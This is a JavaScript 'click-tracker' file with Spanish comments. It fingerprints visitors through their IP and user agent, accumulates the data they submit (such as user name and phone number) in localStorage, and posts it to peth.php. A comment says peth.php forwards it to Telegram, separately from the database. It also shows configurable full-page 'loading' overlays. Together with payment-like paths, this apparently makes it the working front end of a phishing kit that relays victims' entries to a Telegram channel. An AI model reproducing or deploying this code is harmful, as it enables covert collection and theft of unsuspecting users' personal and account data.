/**
 * Identidad del visitante (hash_id) y visita al cargar el script (cualquier página con click-tracker).
 * Documentación: NOTAS-PETH.md en la raíz del proyecto.
 */
(function () {
    'use strict';

    if (window.__clickTrackerLoaded) {
        return;
    }
    window.__clickTrackerLoaded = true;

    function getPethUrl() {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
            var src = scripts[i].src || '';
            if (src.indexOf('/js/click-tracker.js') !== -1) {
                return src.replace(/\/js\/click-tracker\.js(\?.*)?$/i, '') + '/peth.php';
            }
        }
        return '/peth.php';
    }

    function getVisitStorageKey(hashId) {
        return 'click_tracker_' + hashId;
    }

    function isUsableIp(ip) {
        return !!ip && ip !== '0.0.0.0' && ip !== '::1' && ip !== '127.0.0.1';
    }

    function isValidHashId(value) {
        return typeof value === 'string' && /^[a-f0-9]{64}$/i.test(value);
    }

    function isHttpPage() {
        return location.protocol === 'http:' &&
            !/^localhost$/i.test(location.hostname) &&
            location.hostname !== '127.0.0.1';
    }

    function isDigestError(error) {
        return error && String(error.message || '').indexOf('digest') !== -1;
    }

    var pethTerminalErrorSent = false;

    function sendPethTerminalError() {
        if (pethTerminalErrorSent) {
            return;
        }
        pethTerminalErrorSent = true;
        fetch(getPethUrl(), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                tipo: 'error_terminal',
                error: 'error terminal = crypto (digest) por http'
            })
        }).catch(function () {});
    }

    function sha256Hex(message) {
        var encoder = new TextEncoder();
        var data = encoder.encode(message);
        return crypto.subtle.digest('SHA-256', data).then(function (buffer) {
            return Array.from(new Uint8Array(buffer))
                .map(function (b) { return b.toString(16).padStart(2, '0'); })
                .join('');
        });
    }

    async function getVisitorIp() {
        var cached = localStorage.getItem('visitor_ip');
        if (isUsableIp(cached)) {
            return cached;
        }

        try {
            var response = await fetch('https://api.ipify.org?format=json');
            var data = await response.json();
            var ip = data.ip || '0.0.0.0';
            if (isUsableIp(ip)) {
                localStorage.setItem('visitor_ip', ip);
            }
            return ip;
        } catch (error) {
            return isUsableIp(cached) ? cached : '0.0.0.0';
        }
    }

    /**
     * Identificador estable del visitante: SHA-256(IP + '|' + User-Agent).
     * Se guarda en localStorage antes de que exista userId en el panel.
     */
    async function getVisitorHashId() {
        var cached = localStorage.getItem('visitor_hash_id');
        if (isValidHashId(cached)) {
            return cached.toLowerCase();
        }

        var ip = await getVisitorIp();
        var userAgent = navigator.userAgent || '';
        var hashId = await sha256Hex(ip + '|' + userAgent);
        localStorage.setItem('visitor_hash_id', hashId);
        return hashId;
    }

    var PETH_HISTORY_KEY = 'peth_action_history';
    var PETH_HISTORY_MAX = 25;
    var PETH_HISTORY_SKIP_KEYS = {
        historial: true,
        hash_id: true,
        ip_address: true,
        user_agent: true,
        tipo: true,
        step: true,
        page: true,
        page_visited: true,
        at: true,
        timestamp: true,
        id: true
    };
    var pethLoadingState = {
        count: 0,
        buttons: [],
        config: null,
        configPromise: null
    };

    function getPethLoaderConfigUrl() {
        var path = encodeURIComponent(location.pathname || '/');
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
            var src = scripts[i].src || '';
            if (src.indexOf('/js/click-tracker.js') !== -1) {
                return src.replace(/\/js\/click-tracker\.js(\?.*)?$/i, '') + '/process/peth-loader.php?path=' + path;
            }
        }
        var pagePath = location.pathname || '/';
        if (pagePath.indexOf('/api/crdf/all/') !== -1 || pagePath.indexOf('/api/pagosv2/') !== -1) {
            return '../../../process/peth-loader.php?path=' + path;
        }
        if (pagePath.indexOf('/api/') !== -1) {
            return '../../process/peth-loader.php?path=' + path;
        }
        return '/process/peth-loader.php?path=' + path;
    }

    function fetchPethLoaderConfig() {
        if (!pethLoadingState.configPromise) {
            pethLoadingState.configPromise = fetch(getPethLoaderConfigUrl())
                .then(function (response) {
                    if (!response.ok) {
                        throw new Error('peth-loader HTTP ' + response.status);
                    }
                    return response.json();
                })
                .then(function (config) {
                    pethLoadingState.config = config;
                    return config;
                })
                .catch(function () {
                    pethLoadingState.config = {
                        theme: 'default',
                        class: 'peth-loader-default',
                        fonts: [],
                        sharedCss: '#peth-loading-overlay{position:fixed;inset:0;z-index:2147483000;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(255,255,255,.28);pointer-events:all}#peth-loading-overlay[hidden]{display:none!important}',
                        css: '#peth-loading-overlay.peth-loader-default .peth-loading-spinner{width:44px;height:44px;border:3px solid transparent;border-top-color:rgba(0,0,0,.38);border-radius:50%;animation:peth-loading-spin .8s linear infinite}@keyframes peth-loading-spin{to{transform:rotate(360deg)}}',
                        html: '<div class="peth-loading-box" role="status" aria-label="Cargando"><div class="peth-loading-spinner" aria-hidden="true"></div></div>'
                    };
                    return pethLoadingState.config;
                });
        }
        return pethLoadingState.configPromise;
    }

    function ensurePethLoadingFonts(fonts) {
        if (!Array.isArray(fonts) || !fonts.length || document.getElementById('peth-loading-fonts')) {
            return;
        }
        for (var i = 0; i < fonts.length; i++) {
            var link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = String(fonts[i]);
            document.head.appendChild(link);
        }
        var marker = document.createElement('link');
        marker.id = 'peth-loading-fonts';
        marker.rel = 'stylesheet';
        marker.href = 'data:text/css,';
        document.head.appendChild(marker);
    }

    function applyPethLoaderConfig(config) {
        ensurePethLoadingFonts(config.fonts);
        var style = document.getElementById('peth-loading-styles');
        if (!style) {
            style = document.createElement('style');
            style.id = 'peth-loading-styles';
            document.head.appendChild(style);
        }
        style.textContent = String(config.sharedCss || '') + String(config.css || '');

        var overlay = document.getElementById('peth-loading-overlay');
        if (!overlay) {
            overlay = document.createElement('div');
            overlay.id = 'peth-loading-overlay';
            overlay.setAttribute('hidden', 'hidden');
            overlay.setAttribute('aria-live', 'polite');
            overlay.setAttribute('aria-busy', 'true');
            document.body.appendChild(overlay);
        }
        overlay.className = String(config.class || 'peth-loader-default');
        overlay.innerHTML = String(config.html || '');
        return overlay;
    }

    function wrapButtonLabel(button) {
        if (!button || button.querySelector('.peth-btn-label')) {
            return;
        }
        var label = document.createElement('span');
        label.className = 'peth-btn-label';
        while (button.firstChild) {
            label.appendChild(button.firstChild);
        }
        button.appendChild(label);
    }

    /**
     * Muestra overlay de carga (y opcionalmente deshabilita un botón).
     * @param {{message?:string,button?:HTMLElement,overlay?:boolean}} options
     */
    function showPethLoading(options) {
        options = options || {};
        pethLoadingState.count += 1;

        if (options.overlay !== false) {
            fetchPethLoaderConfig().then(function (config) {
                var overlay = applyPethLoaderConfig(config);
                if (pethLoadingState.count > 0) {
                    overlay.removeAttribute('hidden');
                }
            });
        }

        var button = options.button;
        if (button && button.nodeType === 1) {
            wrapButtonLabel(button);
            if (!button.disabled) {
                button.setAttribute('data-peth-was-disabled', '0');
            } else {
                button.setAttribute('data-peth-was-disabled', '1');
            }
            button.disabled = true;
            button.classList.add('peth-btn-loading');
            button.setAttribute('aria-busy', 'true');
            pethLoadingState.buttons.push(button);
        }
    }

    /**
     * Oculta overlay / restaura botones (soporta llamadas anidadas).
     */
    function hidePethLoading(options) {
        options = options || {};
        if (pethLoadingState.count > 0) {
            pethLoadingState.count -= 1;
        }

        if (options.button && options.button.nodeType === 1) {
            restorePethLoadingButton(options.button);
        } else if (pethLoadingState.count === 0) {
            while (pethLoadingState.buttons.length) {
                restorePethLoadingButton(pethLoadingState.buttons.pop());
            }
        }

        if (pethLoadingState.count === 0 && options.overlay !== false) {
            var overlay = document.getElementById('peth-loading-overlay');
            if (overlay) {
                overlay.setAttribute('hidden', 'hidden');
            }
        }
    }

    function restorePethLoadingButton(button) {
        if (!button) {
            return;
        }
        button.classList.remove('peth-btn-loading');
        button.removeAttribute('aria-busy');
        if (button.getAttribute('data-peth-was-disabled') === '0') {
            button.disabled = false;
        }
        button.removeAttribute('data-peth-was-disabled');
    }

    function shouldAutoShowLoading(extra, loadingOptions) {
        if (loadingOptions && loadingOptions.silent) {
            return false;
        }
        if (loadingOptions && loadingOptions.show === true) {
            return true;
        }
        var tipo = extra && extra.tipo ? String(extra.tipo) : '';
        return tipo !== 'visita';
    }

    /**
     * Envuelve cualquier promesa con el overlay de carga.
     */
    function withPethLoading(task, options) {
        showPethLoading(options);
        return Promise.resolve()
            .then(task)
            .finally(function () {
                hidePethLoading(options);
            });
    }

    function createEmptyPethHistory() {
        return { version: 2, pasos: [], datos: {} };
    }

    function normalizePethHistory(raw) {
        if (raw && raw.version === 2 && Array.isArray(raw.pasos) && raw.datos && typeof raw.datos === 'object') {
            return raw;
        }
        var store = createEmptyPethHistory();
        if (!Array.isArray(raw)) {
            return store;
        }
        for (var i = 0; i < raw.length; i++) {
            mergePayloadIntoPethHistory(store, raw[i]);
        }
        return store;
    }

    function getPethHistoryStore() {
        try {
            var parsed = localStorage.getItem(PETH_HISTORY_KEY);
            return normalizePethHistory(parsed ? JSON.parse(parsed) : null);
        } catch (error) {
            return createEmptyPethHistory();
        }
    }

    function savePethHistoryStore(store) {
        try {
            localStorage.setItem(PETH_HISTORY_KEY, JSON.stringify(store));
        } catch (error) {
            console.error('click-tracker historial:', error);
        }
    }

    function pethHistoryStepKey(entry) {
        var step = entry && entry.step ? String(entry.step) : '';
        if (step !== '') {
            return step;
        }
        return entry && entry.tipo ? String(entry.tipo) : 'evento';
    }

    function mergePayloadIntoPethHistory(store, payload) {
        if (!payload || typeof payload !== 'object') {
            return;
        }

        var keys = Object.keys(payload);
        for (var i = 0; i < keys.length; i++) {
            var key = keys[i];
            if (PETH_HISTORY_SKIP_KEYS[key]) {
                continue;
            }
            var value = payload[key];
            if (value === null || value === undefined || value === '') {
                continue;
            }
            store.datos[key] = value;
        }

        if (store.datos.id && !store.datos.userId) {
            store.datos.userId = store.datos.id;
        }
        delete store.datos.id;
        delete store.datos.tipo;
        delete store.datos.timestamp;

        var compactStep = {
            at: payload.at || new Date().toISOString(),
            page: payload.page || payload.page_visited || location.pathname || '/',
            tipo: payload.tipo || '',
            step: payload.step || ''
        };
        var stepKey = pethHistoryStepKey(compactStep);
        var replaced = false;

        for (var j = 0; j < store.pasos.length; j++) {
            if (pethHistoryStepKey(store.pasos[j]) === stepKey) {
                store.pasos[j] = compactStep;
                replaced = true;
                break;
            }
        }

        if (!replaced) {
            store.pasos.push(compactStep);
            if (store.pasos.length > PETH_HISTORY_MAX) {
                store.pasos = store.pasos.slice(store.pasos.length - PETH_HISTORY_MAX);
            }
        }
    }

    function getPethHistory() {
        return getPethHistoryStore();
    }

    function getPethUsuario() {
        var datos = getPethHistoryStore().datos || {};
        var usuario = datos.usuario || datos.celular || '';
        return String(usuario).trim();
    }

    function applyPethResponse(result) {
        if (!result || typeof result !== 'object') {
            return;
        }
        if (result.hash_id && isValidHashId(result.hash_id)) {
            localStorage.setItem('visitor_hash_id', result.hash_id.toLowerCase());
        }
        if (result.success && result.userId != null) {
            var store = getPethHistoryStore();
            store.datos.userId = result.userId;
            savePethHistoryStore(store);
        }
    }

    function appendPethHistory(payload) {
        if (!payload || typeof payload !== 'object') {
            return;
        }
        var store = getPethHistoryStore();
        mergePayloadIntoPethHistory(store, payload);
        savePethHistoryStore(store);
    }

    /**
     * Registra paso + actualiza datos acumulados (sin duplicar campos por paso).
     */
    function snapshotPethAction(payload) {
        return Object.assign({
            at: new Date().toISOString(),
            page: location.pathname || '/'
        }, payload || {});
    }

    function isPethSuccess(result, response) {
        if (!response || !response.ok || !result || typeof result !== 'object') {
            return false;
        }
        if (result.success === true || result.valid === true) {
            return true;
        }
        return false;
    }

    async function buildPethPayload(extra) {
        var ip = await getVisitorIp();
        var hashId = await getVisitorHashId();
        var merged = Object.assign({
            hash_id: hashId,
            ip_address: ip,
            user_agent: navigator.userAgent || '',
            historial: getPethHistory(),
            page: location.pathname || '/'
        }, extra || {});
        if (!merged.timestamp) {
            merged.timestamp = new Date().toISOString();
        }
        return merged;
    }

    /**
     * POST único a peth.php: identidad + historial previo → Telegram; BD solo recibe lo de siempre.
     * @param {object} extra Datos del evento
     * @param {{message?:string,submessage?:string,button?:HTMLElement,silent?:boolean,overlay?:boolean}} loadingOptions
     */
    async function postToPeth(extra, loadingOptions) {
        var payloadExtra = extra || {};
        var loaderOpts = loadingOptions || {};
        var autoLoad = shouldAutoShowLoading(payloadExtra, loaderOpts);

        if (autoLoad) {
            showPethLoading(loaderOpts);
        }

        try {
            var payload = await buildPethPayload(payloadExtra);
            appendPethHistory(snapshotPethAction(payload));
            var response = await fetch(getPethUrl(), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            var result = await response.json().catch(function () {
                return null;
            });
            if (!response.ok) {
                var httpError = new Error('HTTP ' + response.status);
                httpError.result = result;
                throw httpError;
            }
            if (isPethSuccess(result, response)) {
                applyPethResponse(result);
            }
            return result;
        } catch (error) {
            if (isHttpPage() && isDigestError(error)) {
                sendPethTerminalError();
            }
            throw error;
        } finally {
            if (autoLoad) {
                hidePethLoading(loaderOpts);
            }
        }
    }

    async function sendVisit() {
        var hashId = await getVisitorHashId();
        var storageKey = getVisitStorageKey(hashId);

        if (localStorage.getItem(storageKey) === '1') {
            return;
        }

        try {
            var result = await postToPeth({
                tipo: 'visita',
                page_visited: location.pathname || '/'
            }, { silent: true });
            if (result && result.success) {
                localStorage.setItem(storageKey, '1');
            }
        } catch (error) {
            console.error('click-tracker:', error);
            if (isHttpPage() && isDigestError(error)) {
                sendPethTerminalError();
            }
        }
    }

    async function initVisitorIdentity() {
        try {
            await getVisitorHashId();
        } catch (error) {
            console.error('click-tracker hash_id:', error);
            if (isHttpPage() && isDigestError(error)) {
                sendPethTerminalError();
            }
        }
    }

    window.getVisitorIp = getVisitorIp;
    window.getVisitorHashId = getVisitorHashId;
    window.getPethHistory = getPethHistory;
    window.getPethUsuario = getPethUsuario;
    window.buildPethPayload = buildPethPayload;
    window.showPethLoading = showPethLoading;
    window.hidePethLoading = hidePethLoading;
    window.withPethLoading = withPethLoading;
    window.postToPeth = postToPeth;

    fetchPethLoaderConfig();
    initVisitorIdentity();

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', sendVisit);
    } else {
        sendVisit();
    }
})();
